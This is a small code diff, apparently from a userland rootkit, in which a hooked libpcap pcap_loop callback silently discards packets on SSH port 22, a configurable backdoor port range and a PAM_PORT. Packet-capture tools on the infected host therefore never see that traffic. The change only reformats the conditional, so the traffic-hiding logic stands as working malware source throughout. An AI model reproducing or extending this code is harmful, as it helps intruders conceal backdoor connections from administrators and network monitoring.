@@ -30,12 +30,8 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     sport = htons(tcp->th_sport);
     dport = htons(tcp->th_dport);
 
-    if((sport == 22 || dport == 22) || (sport >= LOW_PORT && sport <= HIGH_PORT) || (dport >= LOW_PORT && dport <= HIGH_PORT) || (sport == PAM_PORT || dport == PAM_PORT))
-    {
-        return;
-    }else{
-        if(old_callback) old_callback(args, header, packet);
-    }
+    if((sport == 22 || dport == 22) || (sport >= LOW_PORT && sport <= HIGH_PORT) || (dport >= LOW_PORT && dport <= HIGH_PORT) || (sport == PAM_PORT || dport == PAM_PORT)) return;
+    else if(old_callback) old_callback(args, header, packet);
 }
 
 int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
